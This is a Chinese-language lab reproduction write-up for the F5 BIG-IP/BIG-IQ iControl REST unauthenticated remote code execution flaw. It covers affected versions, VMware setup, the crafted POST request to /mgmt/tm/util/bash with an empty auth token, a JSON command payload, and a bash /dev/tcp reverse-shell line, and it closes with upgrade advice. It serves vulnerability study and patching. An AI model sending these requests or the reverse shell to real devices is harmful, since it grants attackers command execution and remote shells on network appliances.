# **0** **x00** **简介**

F5 BIG-IP 是美国``F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。

#  **0** **x0** **1漏洞概述**

F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞中，未经身份验证的攻击者可通过iControl
REST接口，构造恶意请求，执行任意系统命令。

#  **0** **x0** **2影响版本**

F5 BIG-IP 16.0.0-16.0.1

F5 BIG-IP 15.1.0-15.1.2

F5 BIG-IP 14.1.0-14.1.3.1

F5 BIG-IP 13.1.0-13.1.3.5

F5 BIG-IP 12.1.0-12.1.5.2

F5 BIG-IQ 7.1.0-7.1.0.2

F5 BIG-IQ 7.0.0-7.0.0.1

F5 BIG-IQ 6.0.0-6.1.0

#  **0** **x03** **环境搭建**

1、 本次漏洞环境使用F5 16.0.0版本进行搭建，F5下载地址：

https://downloads.f5.com/esd/product.jsp?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.0

2、 注册一个F5账号，访问下载链接，选择相应版本进行下载并同意条款

![1617245190_60653406effeefe47f535.png!small](https://image.3001.net/images/20210401/1617245190_60653406effeefe47f535.png!small)

![1617245198_6065340e1ced7f8325b1c.png!small](https://image.3001.net/images/20210401/1617245198_6065340e1ced7f8325b1c.png!small)

3、选择VMware格式的下载文件，然后选择下载地区这里选择离得近得下载即可

![1617245204_60653414a9e91e03479f0.png!small](https://image.3001.net/images/20210401/1617245204_60653414a9e91e03479f0.png!small)

![1617245210_6065341a01bce9788d72f.png!small](https://image.3001.net/images/20210401/1617245210_6065341a01bce9788d72f.png!small)

4、下载完成后，使用VMwear导入安装

VMwear左上角‘文件’->‘打开‘选择下载好的文件

![1617245216_606534206d91fa6f28ca2.png!small](https://image.3001.net/images/20210401/1617245216_606534206d91fa6f28ca2.png!small)

5、选择同意许可，选择安装位置

![1617245221_6065342520c63e5b1265f.png!small](https://image.3001.net/images/20210401/1617245221_6065342520c63e5b1265f.png!small)

6、配置方面看自己的选择导入后启动即可系统默认账户：root/default登陆后需要修改默认密码

![1617245226_6065342a45cc816a193f1.png!small](https://image.3001.net/images/20210401/1617245226_6065342a45cc816a193f1.png!small)

7、配置完成后打开虚拟机输入初始密码，会提示修改密码 //需要修改强密码

![1617245232_6065343087fdedadba4c3.png!small](https://image.3001.net/images/20210401/1617245232_6065343087fdedadba4c3.png!small)

8、修改完成密码后输入config设置IP

![1617245252_60653444c083766aea5e8.png!small](https://image.3001.net/images/20210401/1617245252_60653444c083766aea5e8.png!small)

9、在浏览器访问此地址需要使用https://your-ip

![1617245255_60653447f0e246b8e0da8.png!small](https://image.3001.net/images/20210401/1617245255_60653447f0e246b8e0da8.png!small)

10、登陆账号为admin登陆密码为之前虚拟机设置得密码，登陆之后需要修改一次密码 需为强密码

![1617245260_6065344c377c48c19a925.png!small](https://image.3001.net/images/20210401/1617245260_6065344c377c48c19a925.png!small)

#  **0** **x0** **4漏洞复现**

1、首先访问以下url，然后使用Burp进行抓包并发送到Repeater(重放)模块

https://your-ip/mgmt/tm/util/bash

![1617245265_60653451e66308fde70d8.png!small](https://image.3001.net/images/20210401/1617245265_60653451e66308fde70d8.png!small)

2、修改数据包GET为POST并在添加上X-F5-Auth-Token字段和Authorization

X-F5-Auth-Token字段值为空

Authorization: Basic YWRtaW46QVNhc1M= 后面使用basse64加密了解码出来为admin:ASasS

![1617245272_606534580c62a68ad9eed.png!small](https://image.3001.net/images/20210401/1617245272_606534580c62a68ad9eed.png!small)

3、在包内添加以下代码执行命令，查看id，添加完成后发送包

{"command":"run","utilCmdArgs":"-c id"}

![1617245277_6065345d0c4a9c866763b.png!small](https://image.3001.net/images/20210401/1617245277_6065345d0c4a9c866763b.png!small)

4、既然可以执行命令，来反弹shell，使用kali监听

{"command":"run","utilCmdArgs":"-c 'bash -i >&/dev/tcp/172.16.1.127/7765
0>&1'"}

![1617245281_60653461f1a4abbd25b93.png!small](https://image.3001.net/images/20210401/1617245281_60653461f1a4abbd25b93.png!small)

![1617245286_606534661c701f543219d.png!small](https://image.3001.net/images/20210401/1617245286_606534661c701f543219d.png!small)

#  **0** **x0** **5修复方式**

1、建议将F5 BIG-IP / BIG-IQ 升级至安全版本。

下载地址参考：

https://support.f5.com/csp/article/K02566623

参考地址：https://mp.weixin.qq.com/s/-WScu2pgUjvjEqWKt5f19A

